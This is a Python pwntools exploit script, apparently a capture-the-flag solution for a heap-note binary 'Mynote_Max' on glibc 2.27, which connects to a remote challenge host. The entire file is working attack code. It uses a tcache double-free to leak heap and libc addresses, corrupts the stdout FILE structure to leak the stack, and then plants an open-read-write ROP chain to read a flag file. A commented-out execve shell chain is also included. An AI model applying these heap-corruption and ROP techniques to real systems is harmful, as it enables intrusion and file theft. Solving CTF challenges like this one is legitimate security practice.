# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
import galatea 
context.log_level = 'debug' 
binary = './Mynote_Max'
elf = ELF('./Mynote_Max')

libc = ELF("./libc-2.27.so")
#libc = elf.libc

context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = '47.99.38.177'
    port = '10002'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def cmd(choice):
    sla(":",choice)

def add(size,content="aaa"):
    cmd(1)
    sla(":",size)
    sa(":",content)

def show(id):
    cmd(2)
    sla(":",id)

def delete(id):
    cmd(3)
    sla(":",id)


add(0x90) #0
add(0x90,p64(0)*4 + "flag\x00")
add(0xf0) #2

for i in range(7):
    delete(0)

show(0)

ru("Content: ")
leak_heap =  u64(p.recv(6).ljust(8,"\x00"))

lg("leak_heap",leak_heap)


delete(1)


delete(2)
delete(2)
delete(2)

show(1)

ru("Content: ")
leak_libc = l64() - 0x70
libc_base = leak_libc - libc.sym["__malloc_hook"]

environ = libc_base + libc.sym['__environ']
stdout = libc_base + libc.sym["_IO_2_1_stdout_"]
puts_addr = libc_base + libc.sym["puts"]
read_addr = libc_base + libc.sym["read"]
flag_addr = leak_heap + (0x5638eddfd320-0x5638eddfd260)


syscall = 0x000000000011007F + libc_base
pop_rax_ret = 0x00000000000439c8 + libc_base
pop_rdi_ret = 0x000000000002155f + libc_base
pop_rsi_ret = 0x0000000000023e6a + libc_base
pop_rdx_ret = 0x0000000000001b96 + libc_base
#59

lg("leak_libc",leak_libc)
lg("libc_base",libc_base)


add(0x90, p64(stdout) )

add(0x90, "a" )

payload = p64(0xfbad1800) + p64(0)*3 + p64(environ-0x10) +p64(environ+0x10)

add(0x90, payload )


stack_addr = l64() - (0x7ffc1e9c4bf8 - 0x7ffc1e9c4b18)
lg("leak_stack",stack_addr)


add(0xf0,p64(stack_addr-0x10 - 0x20))
#full
add(0xf0,"a")

#gdb.attach(p,"b read")

#payload = p64(pop_rdi_ret) + p64(bin_sh) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(pop_rax_ret) + p64(59) +  p64(syscall)

payload_orw = p64(pop_rax_ret) + p64(2) + p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(0) + p64(syscall)

payload_orw+= p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(stack_addr+0x100) + p64(pop_rdx_ret)  + p64(0x100) + p64(read_addr)

payload_orw+= p64(pop_rdi_ret) + p64(stack_addr+0x100) + p64(puts_addr)

add(0xf0,payload_orw)

#dbg()

#delete(3)


p.interactive()


'''
@File    :   MyNoteMax.py
@Time    :   2021/07/05 10:43:30
@Author  :   Niyah 
'''

